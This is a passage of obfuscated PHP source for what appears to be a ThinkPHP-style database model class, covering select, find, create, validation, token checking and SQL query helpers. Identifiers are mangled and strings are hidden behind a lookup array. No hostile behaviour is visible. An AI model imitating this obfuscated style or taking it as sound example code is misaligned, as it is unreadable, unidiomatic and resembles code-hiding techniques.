$˜Úˆ¯ß[60])) { $´úç‹Ã[$˜Ş¿…¾û] = array($˜Úˆ¯ß[329], $ •²•ÑŠ); } else { $´úç‹Ã[$˜Ş¿…¾û] = $ •²•ÑŠ; } $this->options[$˜Úˆ¯ß[328]] = $´úç‹Ã; } $ •²•ÑŠ = $this->_parseOptions(); if (is_array($ •²•ÑŠ[$˜Úˆ¯ß[328]]) && isset($ •²•ÑŠ[$˜Úˆ¯ß[328]][$˜Ş¿…¾û])) { $Á´øöä = $ •²•ÑŠ[$˜Úˆ¯ß[328]][$˜Ş¿…¾û]; } $İõéãÍ = $this->db->delete($ •²•ÑŠ); if (!1 !== $İõéãÍ) { $’ó±‘¼ = array(); if (isset($Á´øöä)) { $’ó±‘¼[$˜Ş¿…¾û] = $Á´øöä; } $this->_after_delete($’ó±‘¼, $ •²•ÑŠ); } return $İõéãÍ; } protected function _after_delete($±§ä¸öÁ, $½Œ—Â) { } public function select($õòŠö’ = array()) { $Ù…ÅÊíæ =& $_SERVER[ú÷îèÆÜ]; if (is_string($õòŠö’) || is_numeric($õòŠö’)) { $ã±Œİº¤ = $this->getPk(); if (strpos($õòŠö’, $Ù…ÅÊíæ[60])) { $Î»¼æñ[$ã±Œİº¤] = array($Ù…ÅÊíæ[329], $õòŠö’); } else { $Î»¼æñ[$ã±Œİº¤] = $õòŠö’; } $this->options[$Ù…ÅÊíæ[328]] = $Î»¼æñ; } elseif (!1 === $õòŠö’) { $õòŠö’ = $this->_parseOptions(); return $Ù…ÅÊíæ[330] . $this->db->buildSelectSql($õòŠö’) . $Ù…ÅÊíæ[331]; } $õòŠö’ = $this->_parseOptions(); $éöÒ÷ÙÄ = $this->db->select($õòŠö’); if (!1 === $éöÒ÷ÙÄ) { return !1; } if (empty($éöÒ÷ÙÄ)) { return null; } $this->_afterSelect($éöÒ÷ÙÄ, $õòŠö’); return $éöÒ÷ÙÄ; } protected function _afterSelect(&$Ç½•»¤Ù, $¡Ÿ–…ß) { } public function buildSql($Ïäâœ´Ô = array()) { $Ë¢Ì™Â€ =& $_SERVER[ú÷îèÆÜ]; $Ïäâœ´Ô = $this->_parseOptions($Ïäâœ´Ô); return $Ë¢Ì™Â€[330] . $this->db->buildSelectSql($Ïäâœ´Ô) . $Ë¢Ì™Â€[331]; } public function optionsValue($î¾º¦½ = null) { if (is_null($î¾º¦½)) { return $this->options; } elseif (is_array($î¾º¦½)) { $this->options = array_merge($this->options, $î¾º¦½); } } protected function _parseOptions($ŸùÍØÃ‡ = array()) { $ïëŞèç’ =& $_SERVER[ú÷îèÆÜ]; if (is_array($ŸùÍØÃ‡)) { $ŸùÍØÃ‡ = array_merge($this->options, $ŸùÍØÃ‡); } $this->options = array(); if (!isset($ŸùÍØÃ‡[$ïëŞèç’[332]])) { $ŸùÍØÃ‡[$ïëŞèç’[332]] = $this->getTableName(); $¸ÅÍµßÛ = $this->fields; } else { $¸ÅÍµßÛ = $this->getDbFields(); } if (!empty($ŸùÍØÃ‡[$ïëŞèç’[333]])) { $ŸùÍØÃ‡[$ïëŞèç’[332]] .= $ïëŞèç’[63] . $ŸùÍØÃ‡[$ïëŞèç’[333]]; } $ŸùÍØÃ‡[$ïëŞèç’[334]] = $this->name; if (isset($ŸùÍØÃ‡[$ïëŞèç’[328]]) && is_array($ŸùÍØÃ‡[$ïëŞèç’[328]]) && !empty($¸ÅÍµßÛ) && !isset($ŸùÍØÃ‡[$ïëŞèç’[335]]) && !isset($ŸùÍØÃ‡[$ïëŞèç’[332]])) { foreach ($ŸùÍØÃ‡[$ïëŞèç’[328]] as $¥¦‘Ôê => $È¾€œ¶) { $¥¦‘Ôê = trim($¥¦‘Ôê); if (in_array($¥¦‘Ôê, $¸ÅÍµßÛ, !0)) { if (is_scalar($È¾€œ¶)) { $this->_parseType($ŸùÍØÃ‡[$ïëŞèç’[328]], $¥¦‘Ôê); } } elseif (!is_numeric($¥¦‘Ôê) && $ïëŞèç’[21] != substr($¥¦‘Ôê, 0, 1) && !1 === strpos($¥¦‘Ôê, $ïëŞèç’[20]) && !1 === strpos($¥¦‘Ôê, $ïëŞèç’[313]) && !1 === strpos($¥¦‘Ôê, $ïëŞèç’[336]) && !1 === strpos($¥¦‘Ôê, $ïëŞèç’[337])) { unset($ŸùÍØÃ‡[$ïëŞèç’[328]][$¥¦‘Ôê]); } } } $this->_options_filter($ŸùÍØÃ‡); return $ŸùÍØÃ‡; } protected function _options_filter(&$…µµÉØß) { } protected function _parseType(&$©´ßì˜, $È‡Œ¤›) { $ø¶ò”Æ =& $_SERVER[ú÷îèÆÜ]; if (empty($this->options[$ø¶ò”Æ[338]][$ø¶ò”Æ[4] . $È‡Œ¤›])) { $Ğ—ú½ŞÄ = strtolower($this->fields[$ø¶ò”Æ[305]][$È‡Œ¤›]); if (!1 !== strpos($Ğ—ú½ŞÄ, $ø¶ò”Æ[339])) { } elseif (!1 === strpos($Ğ—ú½ŞÄ, $ø¶ò”Æ[340]) && !1 !== strpos($Ğ—ú½ŞÄ, $ø¶ò”Æ[341])) { $©´ßì˜[$È‡Œ¤›] = intval($©´ßì˜[$È‡Œ¤›]); } elseif (!1 !== strpos($Ğ—ú½ŞÄ, $ø¶ò”Æ[342]) || !1 !== strpos($Ğ—ú½ŞÄ, $ø¶ò”Æ[343])) { $©´ßì˜[$È‡Œ¤›] = floatval($©´ßì˜[$È‡Œ¤›]); } elseif (!1 !== strpos($Ğ—ú½ŞÄ, $ø¶ò”Æ[344])) { $©´ßì˜[$È‡Œ¤›] = (bool) $©´ßì˜[$È‡Œ¤›]; } } } public function find($îÓö«á´ = array()) { $‘áŞ›£‡ =& $_SERVER[ú÷îèÆÜ]; if (is_numeric($îÓö«á´) || is_string($îÓö«á´)) { $¶Èªî’‡[$this->getPk()] = intval($îÓö«á´); $this->options[$‘áŞ›£‡[328]] = $¶Èªî’‡; } $this->options[$‘áŞ›£‡[345]] = 1; $îÓö«á´ = $this->_parseOptions(); $ä’ØË³Ù = $this->db->select($îÓö«á´); if (!1 === $ä’ØË³Ù) { return !1; } if (empty($ä’ØË³Ù)) { return null; } $this->data = $ä’ØË³Ù[0]; $this->_afterFind($this->data, $îÓö«á´); if (!empty($this->options[$‘áŞ›£‡[346]])) { return $this->returnResult($this->data, $this->options[$‘áŞ›£‡[346]]); } return $this->data; } protected function _afterFind(&$—Â¯ÀÈÊ, $ÎĞÈÈø­) { } protected function returnResult($ù±€÷, $ÔıìÈÅÎ = '') { $òÜÅ§é„ =& $_SERVER[ú÷îèÆÜ]; if ($ÔıìÈÅÎ) { if (is_callable($ÔıìÈÅÎ)) { return call_user_func($ÔıìÈÅÎ, $ù±€÷); } switch (strtolower($ÔıìÈÅÎ)) { case $òÜÅ§é„[347]: return json_encode($ù±€÷); case $òÜÅ§é„[348]: return xml_encode($ù±€÷); } } return $ù±€÷; } public function parseFieldsMap($³ıÊÎ½†, $ù¬Ñú•¿ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $†İÌÆË¤ => $Š¡ï‰) { if ($ù¬Ñú•¿ == 1) { if (isset($³ıÊÎ½†[$Š¡ï‰])) { $³ıÊÎ½†[$†İÌÆË¤] = $³ıÊÎ½†[$Š¡ï‰]; unset($³ıÊÎ½†[$Š¡ï‰]); } } else { if (isset($³ıÊÎ½†[$†İÌÆË¤])) { $³ıÊÎ½†[$Š¡ï‰] = $³ıÊÎ½†[$†İÌÆË¤]; unset($³ıÊÎ½†[$†İÌÆË¤]); } } } } return $³ıÊÎ½†; } public function setField($ÁãÎ‘¹ı, $ô¥»§ƒ» = '') { if (is_array($ÁãÎ‘¹ı)) { $Á±ºìè¤ = $ÁãÎ‘¹ı; } else { $Á±ºìè¤[$ÁãÎ‘¹ı] = $ô¥»§ƒ»; } return $this->save($Á±ºìè¤); } public function setAdd($ğÀ”¯Ê¦, $‘†Ì§ª— = 1) { $ƒÚ…Óç¿ =& $_SERVER[ú÷îèÆÜ]; $éšˆÑ·­ = $ğÀ”¯Ê¦ . $ƒÚ…Óç¿[349] . $‘†Ì§ª—; if ($‘†Ì§ª— < 0) { $éšˆÑ·­ = $ğÀ”¯Ê¦ . $‘†Ì§ª—; } return $this->setField($ğÀ”¯Ê¦, array($ƒÚ…Óç¿[350], $éšˆÑ·­)); } public function getField($˜¤öíš, $À¶Û‡§ = null) { $Á¢ªø›Ÿ =& $_SERVER[ú÷îèÆÜ]; $®¢±Íô[$Á¢ªø›Ÿ[326]] = $˜¤öíš; $®¢±Íô = $this->_parseOptions($®¢±Íô); $˜¤öíš = trim($˜¤öíš); if (strpos($˜¤öíš, $Á¢ªø›Ÿ[60])) { if (!isset($®¢±Íô[$Á¢ªø›Ÿ[345]])) { $®¢±Íô[$Á¢ªø›Ÿ[345]] = is_numeric($À¶Û‡§) ? $À¶Û‡§ : $Á¢ªø›Ÿ[22]; } $ÊÁõ¿ªÃ = $this->db->select($®¢±Íô); if (!empty($ÊÁõ¿ªÃ)) { $ÒÙÈâå¥ = explode($Á¢ªø›Ÿ[60], $˜¤öíš); $˜¤öíš = array_keys($ÊÁõ¿ªÃ[0]); $—û´Ó”š = array_shift($˜¤öíš); $´¡Î¬º¯ = array_shift($˜¤öíš); $ÏÖ³·›· = array(); $îÕÛˆ¨° = count($ÒÙÈâå¥); foreach ($ÊÁõ¿ªÃ as $µË«şíĞ) { $­áİùÜ× = $µË«şíĞ[$—û´Ó”š]; if (2 == $îÕÛˆ¨°) { $ÏÖ³·›·[$­áİùÜ×] = $µË«şíĞ[$´¡Î¬º¯]; } else { $ÏÖ³·›·[$­áİùÜ×] = is_string($À¶Û‡§) ? implode($À¶Û‡§, $µË«şíĞ) : $µË«şíĞ; } } return $ÏÖ³·›·; } } else { if (!0 !== $À¶Û‡§) { $®¢±Íô[$Á¢ªø›Ÿ[345]] = is_numeric($À¶Û‡§) ? $À¶Û‡§ : 1; } if ($À¶Û‡§ === $Á¢ªø›Ÿ[308]) { unset($®¢±Íô[$Á¢ªø›Ÿ[345]]); } $µË«şíĞ = $this->db->select($®¢±Íô); if (!empty($µË«şíĞ)) { if ($À¶Û‡§ === $Á¢ªø›Ÿ[308]) { return reset($µË«şíĞ[0]); } if (!0 !== $À¶Û‡§ && 1 == $®¢±Íô[$Á¢ªø›Ÿ[345]]) { return reset($µË«şíĞ[0]); } foreach ($µË«şíĞ as $ àìêã¿) { $¸´ş„¦[] = $ àìêã¿[$˜¤öíš]; } return $¸´ş„¦; } } return null; } public function create($ù­Ö–‡¢ = '', $˜õÙ÷Òá = '') { $ıÏ¦à© =& $_SERVER[ú÷îèÆÜ]; if (empty($ù­Ö–‡¢)) { $ù­Ö–‡¢ = $_POST; } elseif (is_object($ù­Ö–‡¢)) { $ù­Ö–‡¢ = get_object_vars($ù­Ö–‡¢); } if (empty($ù­Ö–‡¢) || !is_array($ù­Ö–‡¢)) { $this->error = think_lang($ıÏ¦à©[324]); return !1; } $ù­Ö–‡¢ = $this->parseFieldsMap($ù­Ö–‡¢, 0); $˜õÙ÷Òá = $˜õÙ÷Òá ? $˜õÙ÷Òá : (!empty($ù­Ö–‡¢[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$ıÏ¦à©[326]])) { $º×úİµÇ = $this->options[$ıÏ¦à©[326]]; unset($this->options[$ıÏ¦à©[326]]); } elseif ($˜õÙ÷Òá == THINK_MODEL_INSERT && isset($this->insertFields)) { $º×úİµÇ = $this->insertFields; } elseif ($˜õÙ÷Òá == THINK_MODEL_UPDATE && isset($this->updateFields)) { $º×úİµÇ = $this->updateFields; } if (isset($º×úİµÇ)) { if (is_string($º×úİµÇ)) { $º×úİµÇ = explode($ıÏ¦à©[60], $º×úİµÇ); } if (think_config($ıÏ¦à©[351])) { $º×úİµÇ[] = think_config($ıÏ¦à©[352]); } foreach ($ù­Ö–‡¢ as $Ë‘ÄÛ§Ç => $Ÿò—›’’) { if (!in_array($Ë‘ÄÛ§Ç, $º×úİµÇ)) { unset($ù­Ö–‡¢[$Ë‘ÄÛ§Ç]); } } } if (!$this->autoValidation($ù­Ö–‡¢, $˜õÙ÷Òá)) { return !1; } if (!$this->autoCheckToken($ù­Ö–‡¢)) { $this->error = think_lang($ıÏ¦à©[353]); return !1; } if ($this->autoCheckFields) { $º×úİµÇ = $this->getDbFields(); foreach ($ù­Ö–‡¢ as $Ë‘ÄÛ§Ç => $Ÿò—›’’) { if (!in_array($Ë‘ÄÛ§Ç, $º×úİµÇ)) { unset($ù­Ö–‡¢[$Ë‘ÄÛ§Ç]); } elseif (MAGIC_QUOTES_GPC && is_string($Ÿò—›’’)) { $ù­Ö–‡¢[$Ë‘ÄÛ§Ç] = stripslashes($Ÿò—›’’); } } } $this->autoOperation($ù­Ö–‡¢, $˜õÙ÷Òá); $this->data = $ù­Ö–‡¢; return $ù­Ö–‡¢; } public function autoCheckToken($Ì€ô“…„) { $çÕÂù =& $_SERVER[ú÷îèÆÜ]; if (isset($this->options[$çÕÂù[354]]) && !$this->options[$çÕÂù[354]]) { return !0; } if (think_config($çÕÂù[351])) { $ˆ÷È¨ò = think_config($çÕÂù[352]); if (!isset($Ì€ô“…„[$ˆ÷È¨ò]) || Session::get($ˆ÷È¨ò)) { return !1; } list($¾„–€è’, $©î”àŠƒ) = explode($çÕÂù[21], $Ì€ô“…„[$ˆ÷È¨ò]); if ($©î”àŠƒ && Session::get($ˆ÷È¨ò . $çÕÂù[20] . $¾„–€è’) === $©î”àŠƒ) { Session::remove($ˆ÷È¨ò . $çÕÂù[20] . $¾„–€è’); return !0; } if (think_config($çÕÂù[355])) { Session::remove($ˆ÷È¨ò . $çÕÂù[20] . $¾„–€è’); } return !1; } return !0; } public function regex($Åş¢©şœ, $™‚àßè—) { $øîè‰å¤ =& $_SERVER[ú÷îèÆÜ]; $ÂÓ©Ê‹¡ = array($øîè‰å¤[356] => $øîè‰å¤[357], $øîè‰å¤[358] => $øîè‰å¤[359], $øîè‰å¤[360] => $øîè‰å¤[361], $øîè‰å¤[362] => $øîè‰å¤[363], $øîè‰å¤[364] => $øîè‰å¤[365], $øîè‰å¤[366] => $øîè‰å¤[367], $øîè‰å¤[368] => $øîè‰å¤[369], $øîè‰å¤[343] => $øîè‰å¤[370], $øîè‰å¤[371] => $øîè‰å¤[372]); if (isset($ÂÓ©Ê‹¡[strtolower($™‚àßè—)])) { $™‚àßè— = $ÂÓ©Ê‹¡[strtolower($™‚àßè—)]; } return preg_match($™‚àßè—, $Åş¢©şœ) === 1; } private function autoOperation(&$šÍ¹ç–, $ïÔşÈâ) { $çßËš…Ÿ =& $_SERVER[ú÷îèÆÜ]; if (!empty($this->options[$çßËš…Ÿ[373]])) { $º¡é–Ğë = $this->options[$çßËš…Ÿ[373]]; unset($this->options[$çßËš…Ÿ[373]]); } elseif (!empty($this->_auto)) { $º¡é–Ğë = $this->_auto; } if (isset($º¡é–Ğë)) { foreach ($º¡é–Ğë as $£ËàÕÙ÷) { if (empty($£ËàÕÙ÷[2])) { $£ËàÕÙ÷[2] = THINK_MODEL_INSERT; } if ($ïÔşÈâ == $£ËàÕÙ÷[2] || $£ËàÕÙ÷[2] == THINK_MODEL_BOTH) { switch (trim($£ËàÕÙ÷[3])) { case $çßËš…Ÿ[374]: case $çßËš…Ÿ[375]: $¸¸¶ÖÚ³ = isset($£ËàÕÙ÷[4]) ? (array) $£ËàÕÙ÷[4] : array(); if (isset($šÍ¹ç–[$£ËàÕÙ÷[0]])) { array_unshift($¸¸¶ÖÚ³, $šÍ¹ç–[$£ËàÕÙ÷[0]]); } if ($çßËš…Ÿ[374] == $£ËàÕÙ÷[3]) { $šÍ¹ç–[$£ËàÕÙ÷[0]] = call_user_func_array($£ËàÕÙ÷[1], $¸¸¶ÖÚ³); } else { $šÍ¹ç–[$£ËàÕÙ÷[0]] = call_user_func_array(array(&$this, $£ËàÕÙ÷[1]), $¸¸¶ÖÚ³); } break; case $çßËš…Ÿ[326]: $šÍ¹ç–[$£ËàÕÙ÷[0]] = $šÍ¹ç–[$£ËàÕÙ÷[1]]; break; case $çßËš…Ÿ[376]: if ($çßËš…Ÿ[22] === $šÍ¹ç–[$£ËàÕÙ÷[0]]) { unset($šÍ¹ç–[$£ËàÕÙ÷[0]]); } break; case $çßËš…Ÿ[377]: default: $šÍ¹ç–[$£ËàÕÙ÷[0]] = $£ËàÕÙ÷[1]; } if (!1 === $šÍ¹ç–[$£ËàÕÙ÷[0]]) { unset($šÍ¹ç–[$£ËàÕÙ÷[0]]); } } } } return $šÍ¹ç–; } protected function autoValidation($÷÷»âõ¡, $ğÆÇšÜî) { $€Şôœ®É =& $_SERVER[ú÷îèÆÜ]; if (!empty($this->options[$€Şôœ®É[378]])) { $Æª­ú²¿ = $this->options[$€Şôœ®É[378]]; unset($this->options[$€Şôœ®É[378]]); } elseif (!empty($this->_validate)) { $Æª­ú²¿ = $this->_validate; } if (isset($Æª­ú²¿)) { if ($this->patchValidate) { $this->error = array(); } foreach ($Æª­ú²¿ as $ÑÕ†¥‹ => $Ìèî´Ñ) { if (empty($Ìèî´Ñ[5]) || $Ìèî´Ñ[5] == THINK_MODEL_BOTH || $Ìèî´Ñ[5] == $ğÆÇšÜî) { if (0 == strpos($Ìèî´Ñ[2], $€Şôœ®É[379]) && strpos($Ìèî´Ñ[2], $€Şôœ®É[380])) { $Ìèî´Ñ[2] = think_lang(substr($Ìèî´Ñ[2], 2, -1)); } $Ìèî´Ñ[3] = isset($Ìèî´Ñ[3]) ? $Ìèî´Ñ[3] : THINK_EXISTS_VALIDATE; $Ìèî´Ñ[4] = isset($Ìèî´Ñ[4]) ? $Ìèî´Ñ[4] : $€Şôœ®É[381]; switch ($Ìèî´Ñ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($÷÷»âõ¡, $Ìèî´Ñ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($€Şôœ®É[22] != trim($÷÷»âõ¡[$Ìèî´Ñ[0]])) { if (!1 === $this->_validationField($÷÷»âõ¡, $Ìèî´Ñ)) { return !1; } } break; default: if (isset($÷÷»âõ¡[$Ìèî´Ñ[0]])) { if (!1 === $this->_validationField($÷÷»âõ¡, $Ìèî´Ñ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($ù¹¾ëŠ–, $ø‹ıÚÅï) { if (!1 === $this->_validationFieldItem($ù¹¾ëŠ–, $ø‹ıÚÅï)) { if ($this->patchValidate) { $this->error[$ø‹ıÚÅï[0]] = $ø‹ıÚÅï[2]; } else { $this->error = $ø‹ıÚÅï[2]; return !1; } } return; } protected function _validationFieldItem($Î¼Ğ¦‰Ñ, $ˆ÷“˜âÎ) { $ˆºšáäÄ =& $_SERVER[ú÷îèÆÜ]; switch (strtolower(trim($ˆ÷“˜âÎ[4]))) { case $ˆºšáäÄ[374]: case $ˆºšáäÄ[375]: $¨Â¯Òƒ¼ = isset($ˆ÷“˜âÎ[6]) ? (array) $ˆ÷“˜âÎ[6] : array(); if (is_string($ˆ÷“˜âÎ[0]) && strpos($ˆ÷“˜âÎ[0], $ˆºšáäÄ[60])) { $ˆ÷“˜âÎ[0] = explode($ˆºšáäÄ[60], $ˆ÷“˜âÎ[0]); } if (is_array($ˆ÷“˜âÎ[0])) { foreach ($ˆ÷“˜âÎ[0] as $ ê›ä‚æ) { $ÎØÂ³¯¶[$ ê›ä‚æ] = $Î¼Ğ¦‰Ñ[$ ê›ä‚æ]; } array_unshift($¨Â¯Òƒ¼, $ÎØÂ³¯¶); } else { array_unshift($¨Â¯Òƒ¼, $Î¼Ğ¦‰Ñ[$ˆ÷“˜âÎ[0]]); } if ($ˆºšáäÄ[374] == $ˆ÷“˜âÎ[4]) { return call_user_func_array($ˆ÷“˜âÎ[1], $¨Â¯Òƒ¼); } else { return call_user_func_array(array(&$this, $ˆ÷“˜âÎ[1]), $¨Â¯Òƒ¼); } case $ˆºšáäÄ[382]: return $Î¼Ğ¦‰Ñ[$ˆ÷“˜âÎ[0]] == $Î¼Ğ¦‰Ñ[$ˆ÷“˜âÎ[1]]; case $ˆºšáäÄ[383]: if (is_string($ˆ÷“˜âÎ[0]) && strpos($ˆ÷“˜âÎ[0], $ˆºšáäÄ[60])) { $ˆ÷“˜âÎ[0] = explode($ˆºšáäÄ[60], $ˆ÷“˜âÎ[0]); } $Ô¼ŞÏêÊ = array(); if (is_array($ˆ÷“˜âÎ[0])) { foreach ($ˆ÷“˜âÎ[0] as $ ê›ä‚æ) { $Ô¼ŞÏêÊ[$ ê›ä‚æ] = $Î¼Ğ¦‰Ñ[$ ê›ä‚æ]; } } else { $Ô¼ŞÏêÊ[$ˆ÷“˜âÎ[0]] = $Î¼Ğ¦‰Ñ[$ˆ÷“˜âÎ[0]]; } if (!empty($Î¼Ğ¦‰Ñ[$this->getPk()])) { $Ô¼ŞÏêÊ[$this->getPk()] = array($ˆºšáäÄ[384], $Î¼Ğ¦‰Ñ[$this->getPk()]); } if ($this->where($Ô¼ŞÏêÊ)->find()) { return !1; } return !0; default: return $this->check($Î¼Ğ¦‰Ñ[$ˆ÷“˜âÎ[0]], $ˆ÷“˜âÎ[1], $ˆ÷“˜âÎ[4]); } } public function check($‘‚Á¸¹, $³“ßÙ¢Ô, $¿×¹à¼ş = "\162\145\x67\x65\x78") { $„‚´´‡† =& $_SERVER[ú÷îèÆÜ]; $¿×¹à¼ş = strtolower(trim($¿×¹à¼ş)); switch ($¿×¹à¼ş) { case $„‚´´‡†[17]: case $„‚´´‡†[385]: $¨¹‘¢§ğ = is_array($³“ßÙ¢Ô) ? $³“ßÙ¢Ô : explode($„‚´´‡†[60], $³“ßÙ¢Ô); return $¿×¹à¼ş == $„‚´´‡†[17] ? in_array($‘‚Á¸¹, $¨¹‘¢§ğ) : !in_array($‘‚Á¸¹, $¨¹‘¢§ğ); case $„‚´´‡†[386]: case $„‚´´‡†[387]: if (is_array($³“ßÙ¢Ô)) { $³ÜÁ’´Â = $³“ßÙ¢Ô[0]; $ØÔú—¸ğ = $³“ßÙ¢Ô[1]; } else { list($³ÜÁ’´Â, $ØÔú—¸ğ) = explode($„‚´´‡†[60], $³“ßÙ¢Ô); } return $¿×¹à¼ş == $„‚´´‡†[386] ? $‘‚Á¸¹ >= $³ÜÁ’´Â && $‘‚Á¸¹ <= $ØÔú—¸ğ : $‘‚Á¸¹ < $³ÜÁ’´Â || $‘‚Á¸¹ > $ØÔú—¸ğ; case $„‚´´‡†[388]: case $„‚´´‡†[389]: return $¿×¹à¼ş == $„‚´´‡†[388] ? $‘‚Á¸¹ == $³“ßÙ¢Ô : $‘‚Á¸¹ != $³“ßÙ¢Ô; case $„‚´´‡†[390]: $šõÜ”ï = mb_strlen($‘‚Á¸¹, $„‚´´‡†[391]); if (strpos($³“ßÙ¢Ô, $„‚´´‡†[60])) { list($³ÜÁ’´Â, $ØÔú—¸ğ) = explode($„‚´´‡†[60], $³“ßÙ¢Ô); return $šõÜ”ï >= $³ÜÁ’´Â && $šõÜ”ï <= $ØÔú—¸ğ; } else { return $šõÜ”ï == $³“ßÙ¢Ô; } case $„‚´´‡†[392]: list($£«ßíô, $ÔßË§îŸ) = explode($„‚´´‡†[60], $³“ßÙ¢Ô); if (!is_numeric($£«ßíô)) { $£«ßíô = strtotime($£«ßíô); } if (!is_numeric($ÔßË§îŸ)) { $ÔßË§îŸ = strtotime($ÔßË§îŸ); } return NOW_TIME >= $£«ßíô && NOW_TIME <= $ÔßË§îŸ; case $„‚´´‡†[393]: return in_array(get_client_ip(), explode($„‚´´‡†[60], $³“ßÙ¢Ô)); case $„‚´´‡†[394]: return !in_array(get_client_ip(), explode($„‚´´‡†[60], $³“ßÙ¢Ô)); case $„‚´´‡†[381]: default: return $this->regex($‘‚Á¸¹, $³“ßÙ¢Ô); } } public function query($“ì™É“·, $¡œşß‰ = false) { $×¦ Å­¯ =& $_SERVER[ú÷îèÆÜ]; if (!is_bool($¡œşß‰) && !is_array($¡œşß‰)) { $¡œşß‰ = func_get_args(); array_shift($¡œşß‰); } $“ì™É“· = str_replace(array($×¦ Å­¯[11], $×¦ Å­¯[395]), $×¦ Å­¯[63], $“ì™É“·); $“ì™É“· = $this->parseSql($“ì™É“·, $¡œşß‰); return $this->db->query($“ì™É“·); } public function execute($¯¾‘“·, $…¶À×ãß = false) { if (!is_bool($…¶À×ãß) && !is_array($…¶À×ãß)) { $…¶À×ãß = func_get_args(); array_shift($…¶À×ãß); } $¯¾‘“· = $this->parseSql($¯¾‘“·, $…¶À×ãß); return $this->db->execute($¯¾‘“·); } protected function parseSql($”üÒœ÷€, $ãäÚÎ¢¨) { $…ôòç°Ã =& $_SERVER[ú÷îèÆÜ]; if (!0 === $ãäÚÎ¢¨) { $˜ÊÒ‰Æü = $this->_parseOptions(); $”üÒœ÷€ = $this->db->parseSql($”üÒœ÷€, $˜ÊÒ‰Æü); } elseif (is_array($ãäÚÎ¢¨)) { $ãäÚÎ¢¨ = array_map(array($this->db, $…ôòç°Ã[396]), $ãäÚÎ¢¨); $”üÒœ÷€ = vsprintf($”üÒœ÷€, $ãäÚÎ¢¨); } else { $”üÒœ÷€ = strtr($”üÒœ÷€, array($…ôòç°Ã[397] => $this->getTableName(), $…ôòç°Ã[398] => think_config($…ôòç°Ã[297]))); } $this->db->setModel($this->name); return $”üÒœ÷€; } public function db($Œø¬ôñ· = '', $±ˆ£ƒÙ” = '', $±âçˆÇƒ = array()) { $’ÜÜ•í† =& $_SERVER[ú÷îèÆÜ]; if ($’ÜÜ•í†[22] === $Œø¬ôñ· && $this->db) { return $this->db; } static $€ûÛ½ó¶ = array(); static $ÆÆÇ®° = array(); if (!isset($ÆÆÇ®°[$Œø¬ôñ·]) || isset($ÆÆÇ®°[$Œø¬ôñ·]) && $±ˆ£ƒÙ” && $€ûÛ½ó¶[$Œø¬ôñ·] != $±ˆ£ƒÙ”) { if (!empty($±ˆ£ƒÙ”) && is_string($±ˆ£ƒÙ”) && !1 === strpos($±ˆ£ƒÙ”, $’ÜÜ•í†[18])) { $±ˆ£ƒÙ” = think_config($±ˆ£ƒÙ”); } $Œø¬ôñ· = think_guid($±ˆ£ƒÙ”); $ÆÆÇ®°[$Œø¬ôñ·] = Db::getInstance($±ˆ£ƒÙ”); } elseif (NULL === $±ˆ£ƒÙ”) { $ÆÆÇ®°[$Œø¬ôñ·]->close(); unset($ÆÆÇ®°[$Œø¬ôñ·]); return; } if (!empty($±âçˆÇƒ)) { if (is_string($±âçˆÇƒ)) { parse_str($±âçˆÇƒ, $±âçˆÇƒ); } foreach ($±âçˆÇƒ as $éüÈ½Èú => $Æ¶ßÈ³´) { $this->setProperty($éüÈ½Èú, $Æ¶ßÈ³´); } } $€ûÛ½ó¶[$Œø¬ôñ·] = $±ˆ£ƒÙ”; $this->db = $ÆÆÇ®°[$Œø¬ôñ·]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $­›»Ÿˆº = get_class($this); if ($­›»Ÿˆº == $_SERVER[ú÷îèÆÜ][399]) { return $this->name; } $this->name = substr($­›»Ÿˆº, 0, -5); } return $this->name; } public function getTableName() { $™ªòö§… =& $_SERVER[ú÷îèÆÜ]; if (empty($this->trueTableName)) { $Âè×ñàƒ = !empty($this->tablePrefix) ? $this->tablePrefix : $™ªòö§…[22]; if (!empty($this->tableName)) { $Âè×ñàƒ .= $this->tableName; } else { $Âè×ñàƒ .= think_parse_name($this->name); } $this->trueTableName = strtolower($Âè×ñàƒ); } return (!empty($this->dbName) ? $this->dbName . $™ªòö§…[20] : $™ªòö§…[22]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $‘Ã”ü¬Ï =& $_SERVER[ú÷îèÆÜ]; return isset($this->fields[$‘Ã”ü¬Ï[304]]) ? $this->fields[$‘Ã”ü¬Ï[304]] : $this->pk; } public function getDbFields() { $š¶¢â =& $_SERVER[ú÷îèÆÜ]; if (isset($this->options[$š¶¢â[332]])) { $¶Šï¤§ = $this->db->getFields($this->options[$š¶¢â[332]]); return $¶Šï¤§ ? array_keys($¶Šï¤§) : !1; } if ($this->fields) { $¶Šï¤§ = $this->fields; unset($¶Šï¤§[$š¶¢â[303]], $¶Šï¤§[$š¶¢â[304]], $¶Šï¤§[$š¶¢â[305]], $¶Šï¤§[$š¶¢â[302]]); return $¶Šï¤§; } return !1; } public function data($‚‰‡“Î” = '') { $äœ‡¶® =& $_SERVER[ú÷îèÆÜ]; if ($äœ‡¶®[22] === $‚‰‡“Î” && !empty($this->data)) { return $this->data; } if (is_object($‚‰‡“Î”)) { $‚‰‡“Î” = get_object_vars($‚‰‡“Î”); } elseif (is_string($‚‰‡“Î”)) { parse_str($‚‰‡“Î”, $‚‰‡“Î”); } elseif (!is_array($‚‰‡“Î”)) { think_exception(think_lang($äœ‡¶®[324])); } $this->data = $‚‰‡“Î”; return $this; } public function join($Ü±¡İÔ±) { $‹Ò¥çÊÜ =& $_SERVER[ú÷îèÆÜ]; if (is_array($Ü±¡İÔ±)) { $this->options[$‹Ò¥çÊÜ[335]] = $Ü±¡İÔ±; } elseif (!empty($Ü±¡İÔ±)) { $this->options[$‹Ò¥çÊÜ[335]][] = $Ü±¡İÔ±; } return $this; } public function union($Ò÷úœ¬Í, $ŞÍî—‰à = false) { $¨ãç±ç =& $_SERVER[ú÷îèÆÜ]; if 